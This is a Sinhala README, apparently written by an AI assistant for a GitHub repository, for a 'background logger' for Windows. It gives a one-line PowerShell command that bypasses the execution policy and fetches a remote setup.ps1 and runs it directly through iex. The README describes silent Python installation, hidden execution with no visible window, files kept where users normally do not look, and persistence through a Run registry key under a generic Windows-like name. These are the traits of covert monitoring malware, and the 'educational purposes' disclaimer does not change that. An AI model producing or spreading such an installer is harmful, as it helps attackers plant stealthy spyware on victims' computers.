මෙන්න ඔබගේ GitHub Repository එක සඳහා සකස් කරන ලද, "Copy" බටන් එක නිවැරදිව වැඩ කරන නවතම සහ අවසාන `README.md` ගොනුවේ අන්තර්ගතය.

පහත දැක්වෙන කෝඩ් බ්ලොක් එකේ දකුණු පස ඇති **Copy** බටන් එක ක්ලික් කර මෙය සම්පූර්ණයෙන්ම පිටපත් කර ඔබගේ GitHub එකෙහි `README.md` ගොනුවට ඇතුළත් කරන්න:


# 🚀 Windows Automated Background Logger Setup

මෙම ව්‍යාපෘතිය (Repository) මඟින් ඕනෑම Windows පරිගණකයක ඉතාම පහසුවෙන්, **කිසිදු ගොනුවක් අතින් බාගත කිරීමකින් තොරව (No manual downloads)**, තනි PowerShell කමාන්ඩ් එකක් පමණක් භාවිත කරමින් Python Logger එකක් පසුබිමෙන් (Background Process) ක්‍රියාත්මක වීමට අවශ්‍ය සියලුම සැකසුම් ස්වයංක්‍රීයව සිදු කරයි.

---

## ⚡ ක්ෂණිකව ස්ථාපනය කරන ආකාරය (Quick One-Line Installation)

කිසිදු ගොනුවක් බාගත නොකර, සම්පූර්ණ ක්‍රියාවලියම තනි පියවරකින් සිදු කිරීමට, ඔබගේ පරිගණකයේ **PowerShell** එක **Run as Administrator** ලෙස විවෘත කර පහත කමාන්ඩ් එක කොපි කර (Copy) එකවර Run කරන්න:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iwr -useb [https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/setup.ps1](https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/setup.ps1) | iex
```


### 💡 මෙම කමාන්ඩ් එක ක්‍රියාත්මක වන ආකාරය:

1. **`Set-ExecutionPolicy Bypass`**: වින්ඩෝස් පද්ධතියේ ඇති ආරක්ෂක සීමාවන් තාවකාලිකව මඟහැර මෙම ස්ක්‍රිප්ට් එක ධාවනය කිරීමට අවසර ලබා දෙයි.
2. **`Tls12 Security Protocol`**: පැරණි Windows සංස්කරණ වලදී ඇතිවිය හැකි ආරක්ෂිත සබඳතා දෝෂ (SSL/TLS errors) මඟහරවා ගනී.
3. **`iwr -useb ... | iex`**: GitHub හි ඇති `setup.ps1` ස්ක්‍රිප්ට් එක පරිගණකයේ තැන්පත් නොකර, කෙලින්ම මතකයෙන් (RAM) ක්‍රියාත්මක කරයි.

---

## 🛠️ මෙම ස්ක්‍රිප්ට් එකෙන් ස්වයංක්‍රීයව සිදුවන කාර්යයන්

* **පද්ධති පරීක්ෂාව (System Audit):** පරිගණකයේ Python ස්ථාපනය කර තිබේදැයි පරීක්ෂා කිරීම.
* **නිශ්ශබ්ද ස්ථාපනය (Silent Python Installer):** Python නොමැති නම්, පරිශීලකයාට කිසිදු UI එකක් නොපෙන්වා පසුබිමෙන් **Python 3.12.8** බාගත කර ස්ථාපනය කිරීම.
* **ලයිබ්‍රරි ස්ථාපනය (Dependency Management):** `requirements.txt` හි ඇති සියලුම Python ලයිබ්‍රරි ස්වයංක්‍රීයව ස්ථාපනය කර යාවත්කාලීන කිරීම.
* **අදෘශ්‍යමාන පසුබිම් ධාවනය (Hidden Execution):** කිසිදු කළු පාට Command Prompt (CMD) වින්ඩෝ එකක් නොපෙන්වා, `pythonw.exe` භාවිතයෙන් ලොගර් එක පසුබිමෙන් ක්‍රියාත්මක කිරීම.
* **ස්වයංක්‍රීය Startup පැවැත්ම (Windows Startup):** පරිගණකය ක්‍රියාත්මක වන සෑම වාරයකදීම ලොගර් එක ස්වයංක්‍රීයව ඔන් වීමට අවශ්‍ය පසුබිම් සැකසුම් (Startup Task) සැකසීම.

---

## 📂 අතින් ස්ථාපනය කරන්නේ නම් (Manual Installation)

ඔබට මෙම ස්ක්‍රිප්ට් එක බාගත කර පසුව ක්‍රියාත්මක කිරීමට අවශ්‍ය නම්:

1. මෙම Repository එකේ ඇති `setup.ps1` ගොනුව බාගත කරගන්න.
2. PowerShell විවෘත කර එම ගොනුව ඇති ෆෝල්ඩරය වෙත යන්න (`cd` කමාන්ඩ් එක මඟින්).
3. පහත කමාන්ඩ්ස් පියවරෙන් පියවර ක්‍රියාත්මක කරන්න:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\setup.ps1

```

---

## 🔍 ගොනු පිහිටන ස්ථානය (File Structure)

ස්ථාපනය සාර්ථක වූ පසු ඔබගේ සියලුම ගොනු සහ ලොග් සටහන් (Logs) පරිශීලකයාට සාමාන්‍යයෙන් නොපෙනෙන ආරක්ෂිත ස්ථානයක සුරැකේ:

* **ස්ථාපන ෆෝල්ඩරය:** `C:\Users\<Your-Username>\AppData\Local\WindowsLogger\`
* **ඇතුළත් වන ගොනු:** `logger.py`, `requirements.txt`
* **Windows Startup Registry Key:** `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` -> `WindowsBackgroundLogger`

---

## 🛑 පද්ධතිය සම්පූර්ණයෙන්ම ඉවත් කරන්නේ කෙසේද? (Uninstallation / Removal)

Logger පද්ධතිය පරිගණකයෙන් සම්පූර්ණයෙන්ම ඉවත් කිරීමට අවශ්‍ය නම්, පහත පියවරවල් 3 පිළිවෙලින් සිදු කරන්න:

### 1. පසුබිම් ක්‍රියාවලිය නැවැත්වීම (Stop Background Process)

පසුබිමෙන් ක්‍රියාත්මක වන ලොගර් එක නැවැත්වීමට **Task Manager** (Ctrl + Shift + Esc) විවෘත කර `pythonw.exe` හෝ `Python` Task එක End කරන්න. නැතහොත් PowerShell එකේ පහත කමාන්ඩ් එක රන් කරන්න:

```powershell
Stop-Process -Name "pythonw" -Force -ErrorAction SilentlyContinue

```

### 2. ස්වයංක්‍රීය Startup එක ඉවත් කිරීම (Remove Registry Persistence)

පරිගණකය නැවත පණගැන්වීමේදී (Reboot) මෙය ස්වයංක්‍රීයව ඔන් වීම වැළැක්වීමට, PowerShell එකේ පහත කමාන්ඩ් එක Run කර Registry Key එක ඉවත් කරන්න:

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsBackgroundLogger" -ErrorAction SilentlyContinue

```

### 3. ස්ථාපිත ගොනු සහ ෆෝල්ඩර මකා දැමීම (Delete Files)

අවසාන වශයෙන් AppData හි ඇති සියලුම ස්ක්‍රිප්ට් සහ ලොග් ෆෝල්ඩර් පද්ධතියෙන් සම්පූර්ණයෙන්ම මකා දැමීමට පහත කමාන්ඩ් එක Run කරන්න:

```powershell
Remove-Item -Path "$env:LOCALAPPDATA\WindowsLogger" -Recurse -Force -ErrorAction SilentlyContinue

```

---

## ⚠️ වගකීම් ප්‍රකාශය (Disclaimer)

මෙම මෘදුකාංගය අධ්‍යාපනික අරමුණු (Educational Purposes), පද්ධති පරිපාලන පරීක්ෂණ (Authorized Systems Testing) සහ ස්වයංක්‍රීයකරණ කටයුතු සඳහා පමණක් සපයනු ලැබේ. පරිශීලකයා සතු හෝ නිසි අවසරය ලත් පරිගණක පද්ධති මත පමණක් මෙය ධාවනය කිරීමට වගබලා ගන්න. නිසි අවසරයකින් තොරව වෙනත් අයෙකුගේ පද්ධතියකට මෙය ඇතුළත් කිරීමෙන් සිදුවන ඕනෑම ක්‍රියාවකට මෙම ස්ක්‍රිප්ට් හිමිකරුවන් වගකීම් නොදරයි.

```

```
